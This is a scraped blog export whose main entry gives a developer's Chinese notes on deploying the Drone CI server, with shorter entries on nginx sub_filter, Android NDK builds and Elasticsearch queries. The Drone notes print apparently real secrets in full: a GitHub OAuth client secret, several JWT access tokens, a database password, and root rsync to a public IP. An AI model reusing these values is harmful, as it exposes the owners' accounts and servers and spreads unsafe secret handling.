webhooks\n\ndrone secret add thinkphp5/jinbaiwei --name PLUGINKEY --value @/home/ubuntu/.ssh/idrsa\n\n加密变量设置3种方式\nPASSWORD 123456                        变量设置\nSSHKEY  ${cat /path/to/.ssh/idrsa}  # 命令返回值\nSSHKEY  @/path/to/.ssh/idrsa        # 文件内容\n\n变量传递\n\n drone 0.6\nhttp://readme.drone.io/releases/\n\nworkspace:\n  base: /go\n  path: src/${DRONEREPOLINK:6}\n\nclone:\n  git:\n    image: plugins/git\n    volumes:\n      # - /docker/src/${DRONEREPOLINK:6}:/go/src/${DRONEREPOLINK:6}\n      /docker/src:/go/src\n\npipeline:\n  maven:\n    image: maven\n    volumes:\n      /root/.m2:/root/.m2\n      /docker/src:/go/src\n    commands:\n      mvn clean package\n\n  # busybox:\n  #   image: busybox\n  #   volumes:\n  #     - /docker/src:/go/src\n  #   commands:\n  #     - chown -R 33:33 ../${DRONEREPONAME}\n  #     # - pwd\n  #     # - ls\n  #     # - echo $DRONEWORKSPACE\n  #     # - echo $DRONEREPO\n  #     # - echo $DRONEREPOLINK\n  #     # - echo $DRONECOMMITMESSAGE\n  #     # - echo $DRONEBRANCH\n  #     # - if [ ${DRONEBRANCH} == release ]; then chown -R 33:33 ${LOCALVOLUME}/release ; fi\n  #     # - if [ ${DRONEBRANCH} == develop ]; then chown -R 33:33 ${LOCALVOLUME}/develop ; fi\n  rsync:\n    image: drillster/drone-rsync\n    volumes:\n      /docker/src:/go/src\n      /docker/${DRONEREPO}/master:/drone\n    hosts:\n      121.42.244.38\n    port: 222\n    user: root\n    # key: ${PLUGINKEY}\n    source: target/${DRONEREPONAME}/\n    target: /docker/${DRONEREPO}/master/\n    # include:\n    #   - \"app.tar.gz\"\n    #   - \"app.tar.gz.md5\"\n    # exclude:\n    #   - \".\"\n    recursive: true\n    delete: false\n    script:\n      ls -l\n      # - chown -R 33:33 /docker/${DRONEREPO}/master\n      # - cd /docker/${DRONEREPO}/master\n      # - export DRONEREPO=${DRONEREPO}\n      # - export DRONEREPONAME=${DRONEREPONAME}\n      # - docker-compose up -d\n    # 这里脚本是在远程机器/root目录上执行\n\n    # 这里脚本是在远程机器/root目录上执行\n    chown -R 33:33 /docker/${DRONEREPO}/${DRONEBRANCH}/\n    sed -i \"s|CFG\\['url'\\] = .|CFG['url'] = 'http://127.0.0.1/';|g\" /docker/${DRONEREPO}/${DRONEBRANCH}/config.inc.php\n    sed -i \"s|CFG\\['cookiedomain'\\] = .|CFG['cookiedomain'] = '';|g\" /docker/${DRONEREPO}/${DRONEBRANCH}/config.inc.php\n    sed -i \"s|CFG\\['dbhost'\\] = .|CFG['dbhost'] = 'mysql';|g\" /docker/${DRONEREPO}/${DRONEBRANCH}/config.inc.php\n    sed -i \"s|CFG\\['dbname'\\] = .|CFG['dbname'] = 'destoon';|g\" /docker/${DRONEREPO}/${DRONEBRANCH}/config.inc.php\n    sed -i \"s|CFG\\['dbuser'\\] = .|CFG['dbuser'] = 'destoon';|g\" /docker/${DRONEREPO}/${DRONEBRANCH}/config.inc.php\n    sed -i \"s|CFG\\['dbpass'\\] = .|CFG['dbpass'] = 'desToon@2017';|g\" /docker/${DRONEREPO}/${DRONEBRANCH}/config.inc.php\n    docker rm -f ${DRONEREPONAME}; docker run --restart=always -d --name ${DRONEREPONAME} -p 9003:80 --link mariadb:mysql -v /docker/${DRONEREPO}/${DRONEBRANCH}/:/var/www/html rinetd/php:5.6-apache\n    secrets: [ RSYNCKEY,PLUGINKEY ]\n    when:\n      branch: develop\n\n  # ssh:\n  #   image: appleboy/drone-ssh\n  #   volumes:\n  #     - /docker/src/${DRONEREPOLINK:6}:/go/src/${DRONEREPOLINK:6}\n  #\n  #   host: demo.linyibr.com\n  #   # username: root\n  #   # password: ${SSHPASSWORD}\n  #   # ssh-key: ${SSHKEY}\n  #   port: 222\n  #   script:\n  #     - pwd\n\n  #  # script命令是在远程机上执行 PLUGINKEY变量并不会传递过来\n  #  secrets: [ sshpassword,SSHKEY,PLUGINKEY ]\n # drone secret add --repository linyibr/zhongxinguoan --image=appleboy/drone-ssh --name SSHKEY --value @/home/ubuntu/.ssh/idrsa\n\n # drone secret add --repository bianban/lybb --name PLUGINKEY --value @/home/ubuntu/.ssh/idrsa\n\n publish:\n   image: plugins/docker\n   repo: drone/drone\n   tag: [ latest ]\n   secrets: [ dockerusername, dockerpassword ]\n   when:\n     branch: master\n     event: push\n\ndrone 0.5\nDrone\n实例：\nhttps://github.com/rack-roles\nhttps://github.com/drone-demos\n\n插件：\ndrone-plugins\n\nAnsible role to install drone.io\nzenweasel/ansible-drone\nkbrebanov/ansible-drone: Ansible drone role\n 启动 server\n--debug\t\t\t\t\t\t\tstart the server in debug mode [$DRONEDEBUG]\n--server-addr \":8000\"\t\t\t\t\tserver address [$DRONESERVERADDR]\n--server-cert \t\t\t\t\t\tserver ssl cert [$DRONESERVERCERT]\n--server-key \t\t\t\t\t\tserver ssl key [$DRONESERVERKEY]\n--admin [--admin option --admin option]\t\t\tlist of admin users [$DRONEADMIN]\n--orgs [--orgs option --orgs option]\t\t\t\tlist of approved organizations [$DRONEORGS]\n--open\t\t\t\t\t\t\topen user registration [$DRONEOPEN]\n--yaml \".drone.yml\"\t\t\t\t\t\tbuild configuraton file name [$DRONEYAML]\n--cache-tty \"15m0s\"\t\t\t\t\t\tcache duration [$DRONECACHETTY]\n--agent-secret \t\t\t\t\t\tagent secret passcode [$DRONEAGENTSECRET, $DRONESECRET]\n--driver \"sqlite3\"\t\t\t\t\t\tdatabase driver [$DRONEDATABASEDRIVER, $DATABASEDRIVER]\n--datasource \"drone.sqlite\"\t\t\t\t\tdatabase driver configuration string [$DRONEDATABASEDATASOURCE, $DATABASECONFIG]\n\ngithub\nOAuth applications\n配置授权应用的回调地址：Authorization callback URL: http://kbook.org/authorize\n启动drone服务\ndrone server --server-addr=\":80\" --agent-secret=16239bb0e63719b6f133 --open --admin=rinetd --github --github-client=16239bb0e63719b6f133 --github-secret=f854840a2217af573aaf9cbd7119d445e7ab8806\n\n gogs\n--gogs\t\t\t\t\t\t\tgogs driver is enabled [$DRONEGOGS]\n  --gogs-server \"https://github.com\"\t\t\t\tgogs server address [$DRONEGOGSURL]\n  --gogs-git-username \t\t\t\t\t\tgogs service account username [$DRONEGOGSGITUSERNAME]\n  --gogs-git-password \t\t\t\t\t\tgogs service account password [$DRONEGOGSGITPASSWORD]\n  --gogs-private-mode\t\t\t\t\t\tgogs private mode enabled [$DRONEGOGSPRIVATEMODE]\n  --gogs-skip-verify\t\t\t\t\t\tgogs skip ssl verification [$DRONEGOGSSKIPVERIFY]\n\n启动server  域名为：kbook.org 端口\ndrone server --debug --server-addr=\":80\" --agent-secret=123456 --open --admin=rinetd --gogs --gogs-server=\"http://git.yimengapp.com\" --gogs-private-mode --gogs-skip-verify --gogs-git-username=rinetd --gogs-git-password= \nagents can connect with token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoiMTIzNDU2IiwidHlwZSI6ImFnZW50In0.A3W7uJIZovh5Gu1mfOAQxjV9E2T6GgOowKP9CH7-dc\n启动agent\ndrone agent --drone-server=ws://kbook.org/ws/broker --drone-token=123456\n客户端\ndrone -s http://kbook.org -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoicmluZXRkIiwidHlwZSI6InVzZXIifQ.0ZFhdVjrBHert1yuWBk3QFO9sKVm4iPzjTkr1l024c8 repo ls\ndrone -s http://kbook.org -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoic2RseWxzaGwiLCJ0eXBlIjoidXNlciJ9.pz6ip52zIZKumzVxamDk2wCgppHnp1HiZ4DTMB95h40 repo ls\n\nInsufficient privileges to use privileged mode\ndrone exec --repo.trusted\n\n通过drone 命令\ndrone server --server-addr=\":80\" --github --github-client=16239bb0e63719b6f133 --github-secret=f854840a2217af573aaf9cbd7119d445e7ab8806 --agent-secret=16239bb0e63719b6f133 --open\n\nexport DRONESERVER=http://kbook.org\nexport DRONETOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoiMTYyMzliYjBlNjM3MTliNmYxMzMiLCJ0eXBlIjoiYWdlbnQifQ.A4gUVyDDECZDhF429f0fqrZ0pLzL84PgiyK9Td8VKs\ndrone server -s http://kbook.org -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoiMTYyMzliYjBlNjM3MTliNmYxMzMiLCJ0eXBlIjoiYWdlbnQifQ.A4gUVyDDECZDhF429f0fqrZ0pLzL84PgiyK9Td8VKs\n通过docker 运行\n\n 生产模式\ndocker run -d --restart=always --name=drone -p 80:8000 -e DRONEOPEN=true -e DRONESECRET=123456 -e DRONEGOGS=true -e DRONEGOGSURL=\"http://git.yimengapp.com\" -v /var/lib/drone:/var/lib/drone  drone/drone:0.5\n\ndocker run -d --restart=always --name=drone-agent -e DRONESERVER=ws://deadcode.cn/ws/broker -e DRONESECRET=123456 -v /var/run/docker.sock:/var/run/docker.sock drone/drone:0.5 agent\n\ndrone.yimengapp.com\ndocker run -d --restart=always --name=drone-server -p 8000:8000 -e DRONEOPEN=true -e DRONEADMIN=rinetd -e DRONESECRET=123456 -e DRONEGOGS=true -e DRONEGOGSURL=\"http://git.yimengapp.com\" -v /var/lib/drone:/var/lib/drone  drone/drone:0.5\n\ndocker run -d --restart=always --name=drone-agent -e DRONESERVER=ws://drone.yimengapp.com/ws/broker -e DRONESECRET=123456 -v /var/run/docker.sock:/var/run/docker.sock drone/drone:0.5 agent\nexport DRONESERVER=http://drone.yimengapp.com\nexport DRONETOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoicmluZXRkIiwidHlwZSI6InVzZXIifQ.xvEAZXohg5RCDiGHb0T9efLFw5xk4eqVv-BDIb5EwtI\n drone.linyibr.com\ndocker run -d --restart=always --name=drone-server -p 8000:8000 -e DRONEOPEN=true -e DRONEADMIN=rinetd -e DRONESECRET= -e DRONEGOGS=true -e DRONEGOGSURL=\"http://git.linyibr.com\" -v /docker/drone:/var/lib/drone  drone/drone:0.5\n\ndocker run -d --restart=always --name=drone-agent -e DRONESERVER=ws://drone.linyibr.com/ws/broker -e DRONESECRET= -v /var/run/docker.sock:/var/run/docker.sock drone/drone:0.5 agent\n\n调试模式\ndocker run -it --rm --name=drone -p 80:8000 -e DRONEDEBUG=true -e DRONEOPEN=true -e DRONESECRET=123456 -e DRONEGOGS=true -e DRONEGOGSURL=\"http://git.yimengapp.com\" -v /var/lib/drone:/var/lib/drone  drone/drone:0.5\n\ndocker run -it --rm --name=drone-agent -e DRONEDEBUG=true -e DRONESERVER=ws://kbook.org/ws/broker -e DRONESECRET=123456 -v /var/run/docker.sock:/var/run/docker.sock drone/drone:0.5 agent\n\n登录DRONESERVER http://kbook.org 后可以获取到DRONETOKEN\nexport DRONESERVER=http://deadcode.cn\nexport DRONETOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0IjoicmluZXRkIiwidHlwZSI6InVzZXIifQ.oqKKmAhSJdzgmHo0Tw8QR7-BPAAefQmS51lJQXMpLzY\n\ndrone repo ls 查看激活的repo\ndrone repo add yimeng/ym-ios 激活指定repo\ndrone repo rm yimeng/ym-ios  禁用指定repo\n\n    drone repo ls\n    drone repo ls --org=github\n    drone repo ls --format=\"{{ .Link }}\"\n    drone repo info octocat/hello-world\n    drone repo info --format=\"{{ .Link }}\" octocat/hello-world\n    drone repo add yimeng/ym-ios 激活指定repo\n    drone repo rm yimeng/ym-ios  禁用指定repo\n    drone secret ls octocat/hello-world\n    drone secret add\n    drone secret rm\n    drone build info\n    drone build list yimeng/php-yimeng 查看运行状态\n    drone build last yimeng/php-yimeng\n    drone build start\n    drone build stop\n    drone build queue\n    drone deploy\n    drone sign\n    drone exec\n    drone user ls\n    drone user info\n    drone user add\n    drone user rm\n\nsetting up a drone server to use TLS/SSL\nIf you were using certificates with drone 0.4 it will be the same configuration, although the names perhaps changed slightly. You will need to pass the following variables to your container:\n\nDRONESERVERCERT=/path/to/drone.cert\nDRONESERVERKEY=/path/to/drone.key\n\nThese certificates will exist on your host machine, which means their paths need to be mounted into your drone server:\n\n--volume=/path/to/drone.cert:/path/to/drone.cert\n--volume=/path/to/drone.key:/path/to/drone.key\n\nYou can also instruct Docker to expose 443 and forward to drone's default port 8000\n\n-p 443:8000\n\nWhen you configure the agent, you will of course need to update the configuration to use wss. You can read more in the agent docs, but essentially something like this:\n\nDRONESERVER=wss://drone.server.com/ws/broker\n\nAnd finally, if you get cert errors I recommend including the cert chain in your bund;e. Bottom line, drone does not parse certs. Drone uses http.ListenAndServeTLS(cert, key). So any cert issues are coming from the standard library directly, and questions should therefore be directed to the Go support channels.\n\n###########################################################################\ndocker agent\nConfiguration\n\nYou will configure agent with the drone server address and shared secret:\n\n-e DRONESERVER=ws://drone.server.com/ws/broker\n-e DRONESECRET=...\n\nYou should use wss if your drone server is using TLS:\n\n-e DRONESERVER=wss://drone.server.com/ws/broker\n\nYou will configure the agent with access to the host machine’s docker daemon:\n\n-v /var/run/docker.sock:/var/run/docker.sock\n\nInstallation\n\nCreate and run your container:\ndocker run -d \\\n  -e DRONESERVER=ws:// \\\n  -e DRONESECRET=password \\\n  -v /var/run/docker.sock:/var/run/docker.sock \\\n  --restart=always \\\n  --name=drone-agent \\\n  drone/drone:0.5 agent\n\n对比：\nhttps://en.wikipedia.org/wiki/Comparisonofcontinuousintegrationsoftware\n\ndrone 0.5 文档\ndrone 0.5 文档\ndrone demos\n Documentation\n\nDrone documentation is organized into several categories\n\nSetup Guide\nBuild Guide\nPlugin Guide\nCLI Reference\nAPI Reference\n\nDocumentation for 0.5 (unstable)\n\nIf you are using the 0.5 unstable release (master branch) please see the updated documentation:\n\nSetup Guide\nBuild Guide\n\n  install\nSQlite3\napt-get install libsqlite3-dev\nyum install sqlite-devel\ndrone\nwget downloads.drone.io/master/drone.deb \u0026 dpkg -i drone.deb\n  Created symlink from /etc/systemd/system/multi-user.target.wants/drone.service to /lib/systemd/system/drone.service.\nwget downloads.drone.io/master/drone.rpm \u0026 yum localinstall drone.rpm\n\nconfig\n\ndrone --server=192.168.1.106:8000 --token=16239bb0e63719b6f133\ncurl -i 'https://api.github.com/users/whatever?clientid=16239bb0e63719b6f133\u0026clientsecret=f854840a2217af573aaf9cbd7119d445e7ab8806'\n\n运行drone server\nstart on (filesystem and net-device-up)\n\nchdir /var/lib/drone\nconsole log\n\nscript\n        /usr/local/bin/droned --config=/etc/drone/drone.toml\nend script\n~           \n配置文件 /etc/drone/drone.toml\n\n--debug\t\t\t\t\t\t\tstart the server in debug mode [$DRONEDEBUG]\n--server-addr \":8000\"\t\t\t\t\tserver address [$DRONESERVERADDR]\n--server-cert \t\t\t\t\t\tserver ssl cert [$DRONESERVERCERT]\n--server-key \t\t\t\t\t\tserver ssl key [$DRONESERVERKEY]\n--admin [--admin option --admin option]\t\t\tlist of admin users [$DRONEADMIN]\n--orgs [--orgs option --orgs option]\t\t\t\tlist of approved organizations [$DRONEORGS]\n--open\t\t\t\t\t\t\topen user registration [$DRONEOPEN]\n--yaml \".drone.yml\"\t\t\t\t\t\tbuild configuraton file name [$DRONEYAML]\n--cache-tty \"15m0s\"\t\t\t\t\t\tcache duration [$DRONECACHETTY]\n--agent-secret \t\t\t\t\t\tagent secret passcode [$DRONEAGENTSECRET, $DRONESECRET]\n--driver \"sqlite3\"\t\t\t\t\t\tdatabase driver [$DRONEDATABASEDRIVER, $DATABASEDRIVER]\n--datasource \"drone.sqlite\"\t\t\t\t\tdatabase driver configuration string [$DRONEDATABASEDATASOURCE, $DATABASECONFIG]\n--github\t\t\t\t\t\t\tgithub driver is enabled [$DRONEGITHUB]\n--github-server \"https://github.com\"\t\t\t\tgithub server address [$DRONEGITHUBURL]\n--github-context \"continuous-integration/drone\"\t\tgithub status context [$DRONEGITHUBCONTEXT]\n--github-client \t\t\t\t\t\tgithub oauth2 client id [$DRONEGITHUBCLIENT]\n--github-secret \t\t\t\t\t\tgithub oauth2 client secret [$DRONEGITHUBSECRET]\n--github-scope [--github-scope option --github-scope option]\tgithub oauth scope [$DRONEGITHUBSCOPE]\n--github-git-username \t\t\t\t\tgithub machine user username [$DRONEGITHUBGITUSERNAME]\n--github-git-password \t\t\t\t\tgithub machine user password [$DRONEGITHUBGITPASSWORD]\n--github-merge-ref\t\t\t\t\t\tgithub pull requests use merge ref [$DRONEGITHUBMERGEREF]\n--github-private-mode\t\t\t\t\tgithub is running in private mode [$DRONEGITHUBPRIVATEMODE]\n--github-skip-verify\t\t\t\t\t\tgithub skip ssl verification [$DRONEGITHUBSKIPVERIFY]\n--gogs\t\t\t\t\t\t\tgogs driver is enabled [$DRONEGOGS]\n--gogs-server \"https://github.com\"\t\t\t\tgogs server address [$DRONEGOGSURL]\n--gogs-git-username \t\t\t\t\t\tgogs service account username [$DRONEGOGSGITUSERNAME]\n--gogs-git-password \t\t\t\t\t\tgogs service account password [$DRONEGOGSGITPASSWORD]\n--gogs-private-mode\t\t\t\t\t\tgogs private mode enabled [$DRONEGOGSPRIVATEMODE]\n--gogs-skip-verify\t\t\t\t\t\tgogs skip ssl verification [$DRONEGOGSSKIPVERIFY]\n--bitbucket\t\t\t\t\t\t\tbitbucket driver is enabled [$DRONEBITBUCKET]\n--bitbucket-client \t\t\t\t\t\tbitbucket oauth2 client id [$DRONEBITBUCKETCLIENT]\n--bitbucket-secret \t\t\t\t\t\tbitbucket oauth2 client secret [$DRONEBITBUCKETSECRET]\n--gitlab\t\t\t\t\t\t\tgitlab driver is enabled [$DRONEGITLAB]\n--gitlab-server \"https://gitlab.com\"\t\t\t\tgitlab server address [$DRONEGITLABURL]\n--gitlab-client \t\t\t\t\t\tgitlab oauth2 client id [$DRONEGITLABCLIENT]\n--gitlab-secret \t\t\t\t\t\tgitlab oauth2 client secret [$DRONEGITLABSECRET]\n--gitlab-git-username \t\t\t\t\tgitlab service account username [$DRONEGITLABGITUSERNAME]\n--gitlab-git-password \t\t\t\t\tgitlab service account password [$DRONEGITLABGITPASSWORD]\n--gitlab-skip-verify\t\t\t\t\t\tgitlab skip ssl verification [$DRONEGITLABSKIPVERIFY]\n--gitlab-private-mode\t\t\t\t\tgitlab is running in private mode [$DRONEGITLABPRIVATEMODE]\n--stash\t\t\t\t\t\t\tstash driver is enabled [$DRONESTASH]\n--stash-server \t\t\t\t\t\tstash server address [$DRONESTASHURL]\n--stash-consumer-key \t\t\t\t\tstash oauth1 consumer key [$DRONESTASHCONSUMERKEY]\n--stash-consumer-rsa \t\t\t\t\tstash oauth1 private key file [$DRONESTASHCONSUMERRSA]\n--stash-git-username \t\t\t\t\tstash service account username [$DRONESTASHGITUSERNAME]\n--stash-git-password \t\t\t\t\tstash service account password [$DRONESTASHGITPASSWORD]\n--stash-skip-verify\t\t\t\t\t\tstash skip ssl verification [$DRONESTASHSKIPVERIFY]","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 webfront","title":"构建在Docker之上的开源持续集成平台(CI)：Drone","text":"https://github.com/nieweidong/fetool\n\nDrone 是一个构建在Docker之上的开源持续集成平台(CI)。Drone 提供了一组预建的Docker映像，支持12+种语言和几乎所有主要的数据库。这意味着你不必花时间来安装软件和配置您的构建环境。当然，如果你需要一个高度定制的环境Drone提供了足够的灵活性来使用自定义Docker映像。\nossscreenshotdashboard.png\n\nDrone 完全采用Go语言开发。具有快速，高效的特点。\n与其他的CI服务相比有什么不同？\n\n    Drone是开源的\n    Drone是构建在Docker之上\n    Drone 轻松托管在自己的基础架构之上\n    Drone 提供一个 CLI 来运行本地构建，在Docker容器中\n    Drone 默认与 GitHub 集成，很快将支持Bitbucket patch\n\n以下是官方映像列表：\n\nthese are the base images for all Drone containers.\n these are BIG (~3GB) so make sure you have a FAST internet connection\ndocker pull bradrydzewski/ubuntu\ndocker pull bradrydzewski/base\n\nclojure images\ndocker pull bradrydzewski/lein              image: lein\n\ndart images\ndocker pull bradrydzewski/dart:stable       image: dart\n\nerlang images\ndocker pull bradrydzewski/erlang:R16B       image: erlangR16B\ndocker pull bradrydzewski/erlang:R16B02    # image: erlangR16B02\ndocker pull bradrydzewski/erlang:R16B01    # image: erlangR16B01\n\ngcc images (c/c++)\ndocker pull bradrydzewski/gcc:4.6           image: gcc4.6\ndocker pull bradrydzewski/gcc:4.8          # image: gcc4.8\n\ngo images\ndocker pull bradrydzewski/go:1.0            image: go1\ndocker pull bradrydzewski/go:1.1           # image: go1.1\ndocker pull bradrydzewski/go:1.2           # image: go1.2\n\nhaskell images\ndocker pull bradrydzewski/haskell:7.4       image: haskell\n\njava and jdk images\ndocker pull bradrydzewski/java:openjdk6     image: openjdk6\ndocker pull bradrydzewski/java:openjdk7    # image: openjdk7\ndocker pull bradrydzewski/java:oraclejdk7  # image: oraclejdk7\ndocker pull bradrydzewski/java:oraclejdk8  # image: oraclejdk8\n\nnode images\ndocker pull bradrydzewski/node:0.10         image node0.10\ndocker pull bradrydzewski/node:0.8         # image node0.8\n\nphp images\ndocker pull bradrydzewski/php:5.5           image: php5.5\ndocker pull bradrydzewski/php:5.4          # image: php5.4\n\npython images\ndocker pull bradrydzewski/python:2.7        image: python2.7\ndocker pull bradrydzewski/python:3.2       # image: python3.2\ndocker pull bradrydzewski/python:3.3       # image: python3.3\ndocker pull bradrydzewski/python:pypy      # image: pypy\n\nruby images\ndocker pull bradrydzewski/ruby:2.0.0        image: ruby2.0.0\ndocker pull bradrydzewski/ruby:1.9.3       # image: ruby1.9.3\n\nscala images\ndocker pull bradrydzewski/scala:2.10.3      image: scala2.10.3\ndocker pull bradrydzewski/scala:2.9.3      # image: scala2.9.3\n\nDrone 能够为你的构建所加载的数据库容器：\n\nservice:\n  cassandra\n  couchdb\n  elasticsearch\n  neo4j\n  mongodb\n  mysql\n  postgres\n  rabbitmq\n  redis\n  riak\n  zookeeper","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/container_list","title":"golang中container/list包中的坑","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-11 Android Linux GPIO按键输入","title":"Android GPIO输入","text":"---\npetazzoni-device-tree-dummies\nAndroid编译系统参考手册\n 键值从键盘到Linux内核传输过程分析\nAndroid4.2.2自增物理按键frameworks\nandroid kl文件\nandroid4.0 添加一个新的android 键值\n按键从Linux到Android\nAndroid下添加新的自定义键值和按键处理流程\nandroid 添加新的键值，自定义按键\nAndroid添加新键值实现","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx sub_filter替换内容","title":"Nginx替换文本内容sub_filter","text":"首先是示例：\n\nlocation / {\n  subfilter      /head   '/headscript language=\"javascript\" src=\"x.js\"/script';\n  subfilteronce on;\n  subfiltertypes text/html;\n}\n\n解释：\n\nsubfilter 一行代码前面是需要替换的内容，后面单引号内是替换成的内容。\n\nsubfilteronce 意思是只查找并替换一次。on是开启此功能，off是关闭——默认值是on。\n\nsubfiltertypes 一行意思是选定查找替换文件类型为文本型。也可以不加此行，因为默认只查找文本型文件。\n\nsubfilter模块可以用在http, server, location模块中。主要作用就是查找替换文件字符。\n\n比较实用的例子就是，如果我们用模板生成网站的时候，因为疏漏或者别的原因造成代码不如意，但是此时因为文件数量巨大，不方便全部重新生成，那么这个时候我们就可以用此模块来暂时实现纠错。另一方面，我们也可以利用这个实现服务器端文字过滤的效果——至于原因，你懂的。\n\nsubsfilter\n\n   语法;subsfilter 源字段串 目标字段串 [gior]\n\n   默认:无\n\n   适用区域：http, server, location\n\n   subsfilter指令允许在nginx响应输出内容时替换源字段串（正则或固定）为目标字符串。第三个标志含意如下：\ng(默认): 替换所有匹配的字段串。（默认可省略）\n  i: 执行区分大小写的匹配。\n  o: 仅替换首个匹配字符串。\n  r: 使用正则替换模式，默认是固定模式。\n\nsubfilter 由于 gzip 不能插入内容\nNginx 的 subfilter 模块（http://wiki.nginx.org/HttpSubModule）来替换返回文件中的文本。可以用来不修改应用程序的同时，为文件增加一些监控标志，或增加额外的 javascript 用于数据统计等，使用方式如下：\nlocation / {\n  subfilter      \u0026lt;/head\u0026gt;\n    '\u0026lt;/head\u0026gt;\u0026lt;script language=\u0026quot;javascript\u0026quot; src=\u0026quot;$script\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;';\n  subfilteronce on;\n}\n\n当然方式可以更灵活，比如插入 google analytics 代码等等。\n\n但如果后端返回的文件是已经 gzip 压缩过的文件，因为需要解压缩，然后再压缩，subfilter 不支持gzip。为了避免此种情况，我们需要后端不压缩文件，做法就是去除 HTTP 请求头中的 压缩头，指导后端不压缩：\n\nproxysetheader Accept-Encoding \"\";\n\n当然，为了保证到浏览器的数据是压缩的，sub_filter 前端还是需要配置 gzip on 的","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/image","title":"golang中image包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/Android NDK C++ 开发利器：Android Studio","title":"Android NDK C++ 开发利器：Android Studio","text":"---\nhttp://www.androiddevtools.cn/\n\n在今年的Google IO大会上，Google宣布Android Studio开始支持NDK开发。通过和JetBrains的合作，将CLion整合进了Android Studio 1.3，并免费支持NDK C++开发。\n\n使用Gradle编写C++项目脚本\n\n下面这段工程脚本来自Google提供的Sample。\n\napply plugin: 'com.android.model.application'\n\nmodel {\n    android {\n        compileSdkVersion = 22\n        buildToolsVersion = \"22.0.1\"\n\n        defaultConfig.with {\n            minSdkVersion.apiLevel    = 9\n            targetSdkVersion.apiLevel = 22\n            versionCode     =  1\n            versionName     = \"1.0\"\n       }\n    }\n    android.ndk {\n            moduleName = \"game\"\n            cppFlags  += \"-I${file(\"src/main/jni/nativeappglue\")}\".toString()\n            cppFlags  += \"-I${file(\"src/main/jni\")}\".toString()\n            cppFlags  += \"-I${file(\"src/main/jni/data\")}\".toString()\n            ldLibs    += [\"android\", \"EGL\", \"GLESv2\", \"OpenSLES\", \"log\"]\n            stl        = \"stlportstatic\"\n    }\n    android.lintOptions {\n        abortOnError  = false\n    }\n\n    android.buildTypes {\n        release {\n            isMinifyEnabled = true\n        }\n    }\n\n    android.productFlavors {\n        create (\"arm7\") {\n            ndk.abiFilters += \"armeabi-v7a\"\n        }\n        create (\"arm8\") {\n            ndk.abiFilters += \"arm64-v8a\"\n        }\n        create (\"x86-32\") {\n            ndk.abiFilters += \"x86\"\n        }\n        // for detailed abiFilter descriptions, refer to \"Supported ABIs\" @\n        // https://developer.android.com/ndk/guides/abis.htmlsa\n\n        // build one including all cpu architectures\n        create(\"all\")\n    }\n}\n\ndependencies {\n    compile fileTree(dir: 'libs', include: ['*.jar'])\n    compile 'com.android.support:appcompat-v7:22.1.1'\n}\n\nNDK工程的编译配置脚本主要是下面几行：\n  android.ndk {\n            moduleName = \"game\"\n            cppFlags  += \"-I${file(\"src/main/jni/nativeappglue\")}\".toString()\n            cppFlags  += \"-I${file(\"src/main/jni\")}\".toString()\n            cppFlags  += \"-I${file(\"src/main/jni/data\")}\".toString()\n            ldLibs    += [\"android\", \"EGL\", \"GLESv2\", \"OpenSLES\", \"log\"]\n            stl        = \"stlportstatic\"\n    }","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/image_jpg_png","title":"golang中image/jpeg包和image/png包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/container_list0","title":"golang中container/list包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/image_color","title":"golang中image/color包的用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/import","title":"go import用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04 [Elasticsearch]查询（match和term）","title":"elasticsearch 查询（match和term）","text":"elasticsearch 查询（match和term）(http://www.cnblogs.com/yjf512/p/4897294.html)\n把条件中match换成term，如果不特别测试，好像结果是一样的。\n但match和term的含义是不一样的：\nmatch：匹配的时候，会将查询的关键字进行分词，然后根据分词后的结果进行查询。\nterm：直接使用关键字进行查询，不对关键字进行分词。\n\n在大部分的使用场景下，应该使用match的用法，因为用户的输入往往是比较模糊、顺序不确定、带有多个条件的查询。\n\nes中的查询请求有两种方式，一种是简易版的查询，另外一种是使用JSON完整的请求体，叫做结构化查询（DSL）。\n由于DSL查询更为直观也更为简易，所以大都使用这种方式。\nDSL查询是POST过去一个json，由于post的请求是json格式的，所以存在很多灵活性，也有很多形式。\n这里有一个地方注意的是官方文档里面给的例子的json结构只是一部分，并不是可以直接黏贴复制进去使用的。一般要在外面加个query为key的机构。\nmatch\n\n最简单的一个match例子：\n\n查询和\"我的宝马多少马力\"这个查询语句匹配的文档。\n{\n  \"query\": {\n    \"match\": {\n        \"content\" : {\n            \"query\" : \"我的宝马多少马力\"\n        }\n    }\n  }\n}\n上面的查询匹配就会进行分词，比如\"宝马多少马力\"会被分词为\"宝马 多少 马力\", 所有有关\"宝马 多少 马力\", 那么所有包含这三个词中的一个或多个的文档就会被搜索出来。\n并且根据lucene的评分机制(TF/IDF)来进行评分。\nmatchphrase\n\n比如上面一个例子，一个文档\"我的保时捷马力不错\"也会被搜索出来，那么想要精确匹配所有同时包含\"宝马 多少 马力\"的文档怎么做？就要使用 matchphrase 了\n\n{\n  \"query\": {\n    \"matchphrase\": {\n        \"content\" : {\n            \"query\" : \"我的宝马多少马力\"\n        }\n    }\n  